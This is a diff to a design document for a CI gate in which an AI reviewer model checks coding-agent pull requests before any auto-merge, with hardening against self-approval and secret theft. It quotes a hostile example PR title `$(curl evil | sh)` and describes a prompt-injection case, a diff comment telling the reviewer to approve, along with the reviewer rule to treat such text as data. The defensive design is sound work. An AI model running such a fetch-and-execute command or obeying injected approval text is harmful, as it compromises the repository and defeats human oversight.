@@ -50,8 +50,6 @@ actual safety property this was built for.
      reads this with no default and fails closed (posts a `request_changes`
      verdict, sets the `agent-review` status to `failure`) if it is unset.
    - `AUTO_MERGE_ENABLED=true` -- only once steps 1-4 are done.
-   - `AGENT_ALLOWED_ACTORS` -- same comma-separated allowlist `agent-task.yml`
-     already uses (default `mahan-films`).
    - `AGENT_AUTOMERGE_MAX_DIFF_BYTES` -- optional, default `60000`.
    - `AGENT_DAILY_BUDGET_USD` -- optional, default `2`. See "Cost guard"
      below for what this can and can't actually enforce.
@@ -64,18 +62,43 @@ actual safety property this was built for.
 
 ## How the gate works
 
-`agent-review.yml` runs on every `pull_request` from an `agent/*` branch
-(same-repo only, never a fork). It:
+**Neither workflow ever checks out or executes anything from a PR's head.**
+Both jobs check out only `main` (the default branch), so `review_gate.py`,
+`automerge_gate.py` and `cost_ledger.py` are always the trusted, reviewed
+copies -- never a version an agent's own PR (or a prompt-injected diff)
+could have modified to self-approve or exfiltrate `OPENROUTER_AGENT_KEY`.
+The diff itself is fetched read-only via `gh pr diff` (an API call, not a
+checkout) and sent to the reviewer model as inert text. Every value that
+originates from the PR (title, body) or a step output is passed through a
+step's `env:` and referenced as a shell variable, never interpolated
+directly into a `run:` script -- a PR titled `` $(curl evil | sh) `` must
+not run anything.
 
-1. Computes the diff against the PR's base commit.
-2. Waits for `ci.yml`'s conclusion on that commit.
-3. Sends the diff + CI status to `AGENT_REVIEW_MODEL` via OpenRouter, with
+**Trigger note:** a PR opened by `agent-task.yml` is authored with the
+built-in `GITHUB_TOKEN`, and GitHub does not fire `pull_request` events for
+a `GITHUB_TOKEN`-authored PR (the same anti-recursion rule `ci.yml` already
+works around). `agent-review.yml` is therefore triggered primarily by
+`workflow_dispatch` (input `pr_number`), which `agent-task.yml` calls right
+after opening a PR -- the same pattern it already uses to dispatch `ci.yml`.
+Its `pull_request` trigger is a secondary path only (e.g. a human pushing an
+`agent/*` branch directly). `agent-automerge.yml` has **no** `pull_request`
+trigger at all -- only `workflow_run` (reacting to `Agent review`/`CI`
+completing, always evaluated using the workflow file on `main`, never the
+PR's own copy) and an optional `workflow_dispatch` for a manual re-check.
+
+`agent-review.yml`:
+
+1. Resolves the PR (number, branch, head/base sha, title, body) via `gh pr
+   view`, from whichever trigger supplied the PR number.
+2. Fetches the diff against the PR's base commit via `gh pr diff`.
+3. Waits for `ci.yml`'s conclusion on that commit.
+4. Sends the diff + CI status to `AGENT_REVIEW_MODEL` via OpenRouter, with
    the diff explicitly framed as **untrusted input** (a coding agent's diff
    can contain a prompt-injection attempt, e.g. a comment telling the
    reviewer to approve regardless of content -- the reviewer prompt tells the
    model to treat that as data to flag, not an instruction to follow). See
    `output_apps/ecosystem_core/src/factory/review_gate.py`.
-4. Posts the verdict (`approve`/`request_changes`, `risk`, `reasons`) as a PR
+5. Posts the verdict (`approve`/`request_changes`, `risk`, `reasons`) as a PR
    comment and sets a commit status named `agent-review`.
 
 `agent-automerge.yml` runs only when `AUTO_MERGE_ENABLED == 'true'`, and
@@ -83,9 +106,17 @@ merges (`gh pr merge --squash --auto`) only when **all** of these hold
 (`output_apps/ecosystem_core/src/factory/automerge_gate.py::decide`):
 
 - Branch starts with `agent/`.
-- PR author is in `AGENT_ALLOWED_ACTORS`.
+- **PR author is exactly `github-actions[bot]`** -- not any human login.
+  Agent PRs are opened with the built-in `GITHUB_TOKEN`, which GitHub
+  attributes to this app account; a PR a human opened directly, even from an
+  `agent/*` branch, never auto-merges. The head commit's own author (a
+  cheap, best-effort provenance check) is checked the same way when
+  available.
 - CI concluded `success`.
-- `agent-review` verdict is `approve` **and** risk is `low`.
+- The `agent-review` commit status was itself posted by `github-actions[bot]`
+  -- a status posted by any other identity is ignored (treated as "no
+  review"), so a compromised or malicious status can't fake an approval --
+  **and** its verdict is `approve` **and** risk is `low`.
 - Diff is at or under `AGENT_AUTOMERGE_MAX_DIFF_BYTES`.
 - No changed path matches the deny list: auth (`*auth*`, `*_auth*`), payments
   (`zibal`, `*/payment/*`), secrets (`.env`, `.env.*`), `.github/**`,
@@ -93,7 +124,18 @@ merges (`gh pr merge --squash --auto`) only when **all** of these hold
   `config/models.yaml`, `scripts/ops/**`, `**/migrations/**`.
 
 Any failing condition labels the PR `needs-human` and comments why, instead
-of merging.
+of merging. `agent-automerge.yml`'s job has `contents: write` (needed for
+`gh pr merge` to push the squash-merge commit) -- every other permission on
+both workflows stays at the minimum needed (`contents: read`,
+`pull-requests: write`, `statuses: write`, `actions: read`, as applicable).
+
+**Known limitation:** `agent-automerge.yml` re-derives the `agent-review`
+verdict/risk from the commit status's `description` text
+(`verdict=... risk=...`), not a structured, persisted artifact -- GitHub
+Actions gives no cross-run storage without adding external state, and the
+commit status is the one place both workflows can read/write without one.
+This is functional but a bit fragile; a follow-up could move to a small
+persisted artifact or a repo-scoped check-run output instead.
 
 ## Cost guard
 
